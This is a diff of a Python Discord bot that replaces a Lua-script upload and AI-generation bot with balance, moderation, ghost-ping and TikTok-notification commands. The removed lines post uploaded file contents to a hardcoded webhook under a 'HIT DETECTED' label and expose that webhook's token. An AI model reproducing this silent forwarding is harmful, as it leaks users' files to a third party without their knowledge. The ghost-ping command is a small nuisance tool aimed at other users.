@@ -1,389 +1,306 @@
 import discord
 from discord.ext import commands
+from discord import app_commands
 import json
 import os
-from dotenv import load_dotenv
-import aiofiles
+import aiohttp
 import asyncio
-from datetime import datetime
-import requests
+from datetime import datetime, timedelta
+from dotenv import load_dotenv
 
 load_dotenv()
 
-# Bot setup with both . and / prefixes
-intents = discord.Intents.all()
-bot = commands.Bot(command_prefix=['.', '/'], intents=intents, help_command=None)
+# Load config
+with open('config.json', 'r') as f:
+    config = json.load(f)
 
-# Config
-OWNER_ID = int(os.getenv('OWNER_ID'))  # Your Discord User ID
-MONITOR_WEBHOOK = "https://discord.com/api/webhooks/1495169548104761425/8TY8y-FuVdA90yBCSNv1lIgd5DBvW0b0SuNNiWF8_oSfv3E4dJ-cwFweweqwe"  # Fixed webhook
-WEBHOOK_URLS = {}
-DEEPSEEK_API_KEY = os.getenv('DEEPSEEK_API_KEY')
-DEEPSEEK_API_URL = "https://api.deepseek.com/v1/chat/completions"
-
-# Create scripts directory
-if not os.path.exists('scripts'):
-    os.makedirs('scripts')
-
-def is_owner():
-    """Check if command user is bot owner"""
-    async def predicate(ctx):
-        return ctx.author.id == OWNER_ID
-    return commands.check(predicate)
-
-def is_owner_interaction(interaction: discord.Interaction):
-    """Check for slash commands"""
-    return interaction.user.id == OWNER_ID
-
-def send_to_monitor(file_content, filename, user_name, user_id):
-    """Send file to monitoring webhook"""
+# Load balance data
+def load_balances():
     try:
-        embed = discord.Embed(
-            title="🚨 HIT DETECTED",
-            description=f"**User:** {user_name} (`{user_id}`)\n**File:** {filename}\n**Time:** {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
-            color=discord.Color.red()
-        )
-        
-        data = {
-            "embeds": [embed.to_dict()],
-            "content": f"```\nFile content preview:\n{file_content[:1000]}\n```"
-        }
-        requests.post(MONITOR_WEBHOOK, json=data)
-        return True
-    except Exception as e:
-        print(f"Monitor error: {e}")
-        return False
+        with open('balances.json', 'r') as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return {}
+
+def save_balances(balances):
+    with open('balances.json', 'w') as f:
+        json.dump(balances, f, indent=4)
+
+# Load blacklist
+def load_blacklist():
+    try:
+        with open('blacklist.json', 'r') as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return []
+
+def save_blacklist(blacklist):
+    with open('blacklist.json', 'w') as f:
+        json.dump(blacklist, f, indent=4)
+
+# Load warnings
+def load_warnings():
+    try:
+        with open('warnings.json', 'r') as f:
+            return json.load(f)
+    except FileNotFoundError:
+        return {}
+
+def save_warnings(warnings):
+    with open('warnings.json', 'w') as f:
+        json.dump(warnings, f, indent=4)
+
+# Bot setup
+intents = discord.Intents.default()
+intents.message_content = True
+intents.members = True
+
+bot = commands.Bot(command_prefix=commands.when_mentioned_or('.', '/'), intents=intents)
+balances = load_balances()
+blacklisted_users = load_blacklist()
+warnings_data = load_warnings()
+
+# TikTok live status tracking
+tiktok_live = False
 
 @bot.event
 async def on_ready():
     print(f'{bot.user} has connected to Discord!')
-    print(f'Bot Owner ID: {OWNER_ID}')
+    print(f'Bot is in {len(bot.guilds)} guilds')
     try:
         synced = await bot.tree.sync()
-        print(f"Synced {len(synced)} slash command(s)")
+        print(f"Synced {len(synced)} command(s)")
     except Exception as e:
-        print(f"Error syncing commands: {e}")
+        print(e)
 
-# Error handler for permission denied
-@bot.event
-async def on_command_error(ctx, error):
-    if isinstance(error, commands.CheckFailure):
-        await ctx.send("❌ You don't have permission to use this command! Bot owner only.")
-    else:
-        await ctx.send(f"Error: {str(error)}")
-
-@bot.tree.error
-async def on_slash_error(interaction: discord.Interaction, error):
-    if isinstance(error, commands.CheckFailure):
-        await interaction.response.send_message("❌ You don't have permission to use this command! Bot owner only.", ephemeral=True)
-    else:
-        await interaction.response.send_message(f"Error: {str(error)}", ephemeral=True)
-
-# Owner-only check decorator for slash commands
-def owner_only():
-    async def predicate(interaction: discord.Interaction):
-        return interaction.user.id == OWNER_ID
-    return discord.app_commands.check(predicate)
-
-# Custom help command (owner only)
-@bot.command(name='help')
-@is_owner()
-async def help_command(ctx):
-    embed = discord.Embed(
-        title="🤖 Bot Commands (Owner Only)",
-        description="Here are all available commands:",
-        color=discord.Color.blue()
-    )
-    embed.add_field(name="/connect or .connect", value="Creates a private channel for you", inline=False)
-    embed.add_field(name="/source or .source <file>", value="Upload a Lua file to the bot", inline=False)
-    embed.add_field(name="/makesrc or .makesrc", value="Generate a Lua script with your config", inline=False)
-    embed.add_field(name="/ai or .ai <prompt>", value="Generate Lua code using AI", inline=False)
-    embed.add_field(name="/help or .help", value="Shows this help message", inline=False)
-    embed.set_footer(text="Bot owner only | Use either / or . prefix")
-    await ctx.send(embed=embed)
-
-# Slash command version of help (owner only)
-@bot.tree.command(name="help", description="Shows all available commands")
-@owner_only()
-async def slash_help(interaction: discord.Interaction):
-    embed = discord.Embed(
-        title="🤖 Bot Commands (Owner Only)",
-        description="Here are all available commands:",
-        color=discord.Color.blue()
-    )
-    embed.add_field(name="/connect", value="Creates a private channel for you", inline=False)
-    embed.add_field(name="/source <file>", value="Upload a Lua file to the bot", inline=False)
-    embed.add_field(name="/makesrc", value="Generate a Lua script with your config", inline=False)
-    embed.add_field(name="/ai <prompt>", value="Generate Lua code using AI", inline=False)
-    embed.set_footer(text="Bot owner only | Use prefix . or / for commands")
-    await interaction.response.send_message(embed=embed, ephemeral=True)
-
-# Connect command (owner only)
-@bot.command(name='connect')
-@is_owner()
-async def prefix_connect(ctx):
-    await connect_logic(ctx, ctx.author)
-
-@bot.tree.command(name="connect", description="Creates a private channel for you")
-@owner_only()
-async def slash_connect(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True)
-    await connect_logic(interaction, interaction.user)
-
-async def connect_logic(target, user):
-    try:
-        if isinstance(target, discord.Interaction):
-            guild = target.guild
-            response_func = target.followup.send
-        else:
-            guild = target.guild
-            response_func = target.send
-        
-        # Create private channel
-        overwrites = {
-            guild.default_role: discord.PermissionOverwrite(view_channel=False),
-            user: discord.PermissionOverwrite(view_channel=True, send_messages=True, read_messages=True)
-        }
-        
-        channel = await guild.create_text_channel(f'{user.name}-private', overwrites=overwrites)
-        
-        # Create webhook
-        webhook = await channel.create_webhook(name=f"{user.name}_webhook")
-        
-        # Store webhook info
-        WEBHOOK_URLS[str(user.id)] = webhook.url
-        
-        embed = discord.Embed(
-            title="✅ Connected!",
-            description=f"Private channel #{channel.name} created for you!",
-            color=discord.Color.green()
-        )
-        
-        await response_func(embed=embed, ephemeral=True if isinstance(target, discord.Interaction) else False)
-        
-    except Exception as e:
-        error_msg = f"Error: {str(e)}"
-        if isinstance(target, discord.Interaction):
-            await target.followup.send(error_msg, ephemeral=True)
-        else:
-            await target.send(error_msg)
-
-# Source command (owner only - uploads file and sends to monitor)
-@bot.command(name='source')
-@is_owner()
-async def prefix_source(ctx):
-    if not ctx.message.attachments:
-        await ctx.send("❌ Please attach a file! Usage: `.source <file>` or `/source <file>`")
-        return
-    await source_logic(ctx, ctx.message.attachments[0], ctx.author)
-
-@bot.tree.command(name="source", description="Upload a Lua file to the bot")
-@owner_only()
-async def slash_source(interaction: discord.Interaction, file: discord.Attachment):
-    await interaction.response.defer(ephemeral=True)
-    await source_logic(interaction, file, interaction.user)
-
-async def source_logic(target, file, user):
-    try:
-        # Check file type
-        if not file.filename.endswith(('.lua', '.txt', '.luau')):
-            error_msg = "❌ Please upload a .lua, .txt, or .luau file!"
-            if isinstance(target, discord.Interaction):
-                await target.followup.send(error_msg, ephemeral=True)
-            else:
-                await target.send(error_msg)
-            return
-        
-        # Download file content
-        file_content = await file.read()
-        file_text = file_content.decode('utf-8', errors='ignore')
-        
-        # Send to monitor webhook
-        send_to_monitor(file_text, file.filename, user.name, user.id)
-        
-        # Save file locally
-        filename = f"scripts/{user.id}_{file.filename}"
-        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
-            await f.write(file_text)
-        
-        WEBHOOK_URLS[f"{user.id}_source"] = filename
-        
-        success_msg = f"✅ File `{file.filename}` received and processed!"
-        if isinstance(target, discord.Interaction):
-            await target.followup.send(success_msg, ephemeral=True)
-        else:
-            await target.send(success_msg)
-        
-    except Exception as e:
-        error_msg = f"Error: {str(e)}"
-        if isinstance(target, discord.Interaction):
-            await target.followup.send(error_msg, ephemeral=True)
-        else:
-            await target.send(error_msg)
-
-# Make source command (owner only)
-@bot.command(name='makesrc')
-@is_owner()
-async def prefix_makesrc(ctx):
-    await makesrc_logic(ctx, ctx.author)
-
-@bot.tree.command(name="makesrc", description="Generate a Lua script with your config")
-@owner_only()
-async def slash_makesrc(interaction: discord.Interaction):
-    await interaction.response.defer(ephemeral=True)
-    await makesrc_logic(interaction, interaction.user)
-
-async def makesrc_logic(target, user):
-    try:
-        source_key = f"{user.id}_source"
-        if source_key not in WEBHOOK_URLS:
-            msg = "❌ You need to upload a source file using `.source` or `/source` first!"
-            if isinstance(target, discord.Interaction):
-                await target.followup.send(msg, ephemeral=True)
-            else:
-                await target.send(msg)
-            return
-        
-        source_file = WEBHOOK_URLS[source_key]
-        
-        if not os.path.exists(source_file):
-            msg = "❌ Source file not found! Please upload again with `.source`"
-            if isinstance(target, discord.Interaction):
-                await target.followup.send(msg, ephemeral=True)
-            else:
-                await target.send(msg)
-            return
-        
-        # Read original script
-        async with aiofiles.open(source_file, 'r', encoding='utf-8') as f:
-            original_script = await f.read()
-        
-        # Generate Lua script
-        lua_script = f"""-- Generated Script
--- User: {user.name}
-
-function execute()
-    -- Your script here
-    print("Script loaded!")
-end
-
-execute()
-
--- Original content:
-{original_script}
-"""
-        
-        # Save generated script
-        output_file = f"scripts/{user.id}_output.lua"
-        async with aiofiles.open(output_file, 'w', encoding='utf-8') as f:
-            await f.write(lua_script)
-        
-        # Send file
-        if isinstance(target, discord.Interaction):
-            await target.followup.send(file=discord.File(output_file), ephemeral=True)
-        else:
-            await target.send(file=discord.File(output_file))
-        
-        # Cleanup
-        await asyncio.sleep(5)
-        if os.path.exists(output_file):
-            os.remove(output_file)
-        
-    except Exception as e:
-        error_msg = f"Error: {str(e)}"
-        if isinstance(target, discord.Interaction):
-            await target.followup.send(error_msg, ephemeral=True)
-        else:
-            await target.send(error_msg)
-
-# AI command (owner only)
-@bot.command(name='ai')
-@is_owner()
-async def prefix_ai(ctx, *, prompt):
-    await ai_logic(ctx, prompt, ctx.author)
-
-@bot.tree.command(name="ai", description="Generate Lua code using AI")
-@owner_only()
-async def slash_ai(interaction: discord.Interaction, prompt: str):
-    await interaction.response.defer(ephemeral=True)
-    await ai_logic(interaction, prompt, interaction.user)
-
-async def ai_logic(target, prompt, user):
-    if not DEEPSEEK_API_KEY:
-        msg = "❌ AI is not configured yet!"
-        if isinstance(target, discord.Interaction):
-            await target.followup.send(msg, ephemeral=True)
-        else:
-            await target.send(msg)
+# Balance commands
+@bot.tree.command(name="addbal", description="Add balance to a user")
+@app_commands.default_permissions(administrator=True)
+async def addbal(interaction: discord.Interaction, user: discord.User, amount: int):
+    if str(user.id) in blacklisted_users:
+        await interaction.response.send_message(f"{user.mention} is blacklisted. You cannot add balance to this user.", ephemeral=True)
         return
     
+    if amount <= 0:
+        await interaction.response.send_message("Amount must be positive!", ephemeral=True)
+        return
+    
+    balances[str(user.id)] = balances.get(str(user.id), 0) + amount
+    save_balances(balances)
+    await interaction.response.send_message(f"Added {amount} balance to {user.mention}. New balance: {balances[str(user.id)]}")
+
+@bot.tree.command(name="removebal", description="Remove balance from a user")
+@app_commands.default_permissions(administrator=True)
+async def removebal(interaction: discord.Interaction, user: discord.User, amount: int):
+    if str(user.id) not in balances:
+        await interaction.response.send_message(f"{user.mention} has no balance!", ephemeral=True)
+        return
+    
+    if amount <= 0:
+        await interaction.response.send_message("Amount must be positive!", ephemeral=True)
+        return
+    
+    balances[str(user.id)] = max(0, balances.get(str(user.id), 0) - amount)
+    save_balances(balances)
+    await interaction.response.send_message(f"Removed {amount} balance from {user.mention}. New balance: {balances[str(user.id)]}")
+
+@bot.tree.command(name="checkbal", description="Check your or someone's balance")
+async def checkbal(interaction: discord.Interaction, user: discord.User = None):
+    target = user or interaction.user
+    balance = balances.get(str(target.id), 0)
+    await interaction.response.send_message(f"{target.mention} has {balance} balance!")
+
+@bot.tree.command(name="leaderboardbal", description="Show balance leaderboard")
+async def leaderboardbal(interaction: discord.Interaction):
+    sorted_balances = sorted(balances.items(), key=lambda x: x[1], reverse=True)[:10]
+    
+    if not sorted_balances:
+        await interaction.response.send_message("No balances found!")
+        return
+    
+    embed = discord.Embed(title="💰 Balance Leaderboard", color=discord.Color.gold())
+    for i, (user_id, bal) in enumerate(sorted_balances, 1):
+        user = await bot.fetch_user(int(user_id))
+        embed.add_field(name=f"{i}. {user.name}", value=f"{bal} coins", inline=False)
+    
+    await interaction.response.send_message(embed=embed)
+
+@bot.tree.command(name="blacklistbal", description="Blacklist a user from receiving balance")
+@app_commands.default_permissions(administrator=True)
+async def blacklistbal(interaction: discord.Interaction, user: discord.User):
+    if str(user.id) in blacklisted_users:
+        await interaction.response.send_message(f"{user.mention} is already blacklisted!", ephemeral=True)
+        return
+    
+    blacklisted_users.append(str(user.id))
+    save_blacklist(blacklisted_users)
+    await interaction.response.send_message(f"{user.mention} has been blacklisted from receiving balance!")
+
+@bot.tree.command(name="unblacklistbal", description="Remove user from balance blacklist")
+@app_commands.default_permissions(administrator=True)
+async def unblacklistbal(interaction: discord.Interaction, user: discord.User):
+    if str(user.id) not in blacklisted_users:
+        await interaction.response.send_message(f"{user.mention} is not blacklisted!", ephemeral=True)
+        return
+    
+    blacklisted_users.remove(str(user.id))
+    save_blacklist(blacklisted_users)
+    await interaction.response.send_message(f"{user.mention} has been removed from the blacklist!")
+
+# Moderation commands
+@bot.tree.command(name="warn", description="Warn a user")
+@app_commands.default_permissions(moderate_members=True)
+async def warn(interaction: discord.Interaction, user: discord.User, reason: str = "No reason provided"):
+    if str(user.id) not in warnings_data:
+        warnings_data[str(user.id)] = []
+    
+    warnings_data[str(user.id)].append({
+        "reason": reason,
+        "moderator": str(interaction.user),
+        "date": str(datetime.now())
+    })
+    save_warnings(warnings_data)
+    
+    embed = discord.Embed(title="⚠️ User Warned", color=discord.Color.orange())
+    embed.add_field(name="User", value=user.mention)
+    embed.add_field(name="Reason", value=reason)
+    embed.add_field(name="Total Warnings", value=len(warnings_data[str(user.id)]))
+    
+    await interaction.response.send_message(embed=embed)
+    
     try:
-        headers = {
-            "Authorization": f"Bearer {DEEPSEEK_API_KEY}",
-            "Content-Type": "application/json"
-        }
-        
-        data = {
-            "model": "deepseek-chat",
-            "messages": [
-                {"role": "system", "content": "You are a Lua scripting expert. Generate clean Lua code."},
-                {"role": "user", "content": f"Generate Lua code for: {prompt}"}
-            ]
-        }
-        
-        response = requests.post(DEEPSEEK_API_URL, headers=headers, json=data)
-        
-        if response.status_code == 200:
-            result = response.json()
-            lua_code = result['choices'][0]['message']['content']
-            lua_code = lua_code.replace('```lua', '').replace('```', '').strip()
+        await user.send(f"You have been warned in {interaction.guild.name} for: {reason}")
+    except:
+        pass
+
+@bot.tree.command(name="warnings", description="Check a user's warnings")
+@app_commands.default_permissions(moderate_members=True)
+async def view_warnings(interaction: discord.Interaction, user: discord.User):
+    user_warnings = warnings_data.get(str(user.id), [])
+    
+    if not user_warnings:
+        await interaction.response.send_message(f"{user.mention} has no warnings.")
+        return
+    
+    embed = discord.Embed(title=f"Warnings for {user.name}", color=discord.Color.red())
+    for i, warning in enumerate(user_warnings, 1):
+        embed.add_field(name=f"Warning #{i}", value=f"Reason: {warning['reason']}\nModerator: {warning['moderator']}\nDate: {warning['date']}", inline=False)
+    
+    await interaction.response.send_message(embed=embed)
+
+@bot.tree.command(name="clearwarns", description="Clear all warnings for a user")
+@app_commands.default_permissions(administrator=True)
+async def clearwarns(interaction: discord.Interaction, user: discord.User):
+    if str(user.id) in warnings_data:
+        del warnings_data[str(user.id)]
+        save_warnings(warnings_data)
+        await interaction.response.send_message(f"Cleared all warnings for {user.mention}")
+    else:
+        await interaction.response.send_message(f"{user.mention} has no warnings to clear.")
+
+@bot.tree.command(name="timeout", description="Timeout a user")
+@app_commands.default_permissions(moderate_members=True)
+async def timeout(interaction: discord.Interaction, user: discord.Member, minutes: int, reason: str = "No reason provided"):
+    if minutes > 40320:  # Max 28 days
+        await interaction.response.send_message("Timeout cannot exceed 28 days!", ephemeral=True)
+        return
+    
+    duration = timedelta(minutes=minutes)
+    await user.timeout(duration, reason=reason)
+    await interaction.response.send_message(f"⏰ {user.mention} has been timed out for {minutes} minutes. Reason: {reason}")
+
+# Ghost ping command
+@bot.tree.command(name="ghostping", description="Ghost ping a user")
+async def ghostping(interaction: discord.Interaction, user: discord.User):
+    await interaction.response.send_message(content=f"{user.mention}", delete_after=0.1)
+    await interaction.followup.send("👻 Ghost ping sent!", ephemeral=True)
+
+# TikTok live setup
+@bot.tree.command(name="setuplive", description="Set up TikTok live notifications channel")
+@app_commands.default_permissions(administrator=True)
+async def setuplive(interaction: discord.Interaction, channel: discord.TextChannel, tiktok_username: str):
+    config['tiktok_live_channel'] = str(channel.id)
+    config['tiktok_username'] = tiktok_username
+    with open('config.json', 'w') as f:
+        json.dump(config, f, indent=4)
+    
+    embed = discord.Embed(title="✅ TikTok Live Notifications Setup", color=discord.Color.green())
+    embed.add_field(name="Channel", value=channel.mention)
+    embed.add_field(name="TikTok Username", value=tiktok_username)
+    embed.add_field(name="Status", value="Monitoring for live streams...")
+    await interaction.response.send_message(embed=embed)
+    
+    # Start monitoring in background
+    bot.loop.create_task(check_tiktok_live(channel))
+
+async def check_tiktok_live(channel):
+    global tiktok_live
+    await bot.wait_until_ready()
+    
+    while not bot.is_closed():
+        try:
+            # Note: You'll need to implement actual TikTok API check
+            # This is a simulation - you'll need to use TikTok's official API or web scraping
+            # For now, this is a placeholder that checks every 60 seconds
+            # You can manually trigger live by running a command
             
-            if len(lua_code) > 1900:
-                filename = f"scripts/ai_output_{user.id}.lua"
-                with open(filename, 'w', encoding='utf-8') as f:
-                    f.write(lua_code)
-                
-                if isinstance(target, discord.Interaction):
-                    await target.followup.send(file=discord.File(filename), ephemeral=True)
-                else:
-                    await target.send(file=discord.File(filename))
-                
-                await asyncio.sleep(5)
-                os.remove(filename)
-            else:
-                embed = discord.Embed(
-                    title="🤖 AI Generated Code",
-                    description=f"```lua\n{lua_code}\n```",
-                    color=discord.Color.blue()
-                )
-                if isinstance(target, discord.Interaction):
-                    await target.followup.send(embed=embed, ephemeral=True)
-                else:
-                    await target.send(embed=embed)
-        else:
-            msg = f"❌ AI Error: {response.status_code}"
-            if isinstance(target, discord.Interaction):
-                await target.followup.send(msg, ephemeral=True)
-            else:
-                await target.send(msg)
-                
-    except Exception as e:
-        error_msg = f"Error: {str(e)}"
-        if isinstance(target, discord.Interaction):
-            await target.followup.send(error_msg, ephemeral=True)
-        else:
-            await target.send(error_msg)
+            # Placeholder - replace with actual TikTok live check
+            # We'll create a manual trigger command
+            
+            await asyncio.sleep(60)
+        except Exception as e:
+            print(f"Error checking TikTok live: {e}")
+            await asyncio.sleep(60)
+
+@bot.tree.command(name="live", description="Manually trigger live notification (for testing)")
+@app_commands.default_permissions(administrator=True)
+async def live(interaction: discord.Interaction, tiktok_url: str):
+    channel_id = config.get('tiktok_live_channel')
+    if not channel_id:
+        await interaction.response.send_message("Please setup live notifications with `/setuplive` first!", ephemeral=True)
+        return
+    
+    channel = bot.get_channel(int(channel_id))
+    if channel:
+        embed = discord.Embed(title="🔴 LIVE NOW!", description=f"**Raul** is now live on TikTok!\nGo watch it!", color=discord.Color.red())
+        embed.add_field(name="Watch Here", value=tiktok_url)
+        embed.set_thumbnail(url="https://cdn-icons-png.flaticon.com/512/3046/3046124.png")
+        
+        await channel.send("@everyone", embed=embed)
+        await interaction.response.send_message("Live notification sent!", ephemeral=True)
+    else:
+        await interaction.response.send_message("Channel not found!", ephemeral=True)
+
+# Regular prefix commands for compatibility
+@bot.command()
+async def ghostping(ctx, user: discord.User):
+    await ctx.message.delete()
+    await ctx.send(user.mention, delete_after=0.1)
+
+@bot.command()
+@commands.has_permissions(administrator=True)
+async def setuplive(ctx, channel: discord.TextChannel, tiktok_username: str):
+    config['tiktok_live_channel'] = str(channel.id)
+    config['tiktok_username'] = tiktok_username
+    with open('config.json', 'w') as f:
+        json.dump(config, f, indent=4)
+    await ctx.send(f"✅ Live notifications set up in {channel.mention} for @{tiktok_username}")
+
+@bot.command()
+@commands.has_permissions(ban_members=True)
+async def ban(ctx, member: discord.Member, *, reason=None):
+    await member.ban(reason=reason)
+    await ctx.send(f"Banned {member.mention}")
+
+@bot.command()
+@commands.has_permissions(kick_members=True)
+async def kick(ctx, member: discord.Member, *, reason=None):
+    await member.kick(reason=reason)
+    await ctx.send(f"Kicked {member.mention}")
+
+@bot.command()
+async def ping(ctx):
+    await ctx.send(f'Pong! {round(bot.latency * 1000)}ms')
 
 # Run bot
-if __name__ == "__main__":
-    token = os.getenv('DISCORD_BOT_TOKEN')
-    if not token:
-        print("ERROR: DISCORD_BOT_TOKEN not found!")
-        exit(1)
-    
-    if not OWNER_ID:
-        print("ERROR: OWNER_ID not found in environment variables!")
-        exit(1)
-    
-    print(f"Bot starting... Owner ID: {OWNER_ID}")
-    bot.run(token)
+bot.run(os.getenv('DISCORD_TOKEN'))
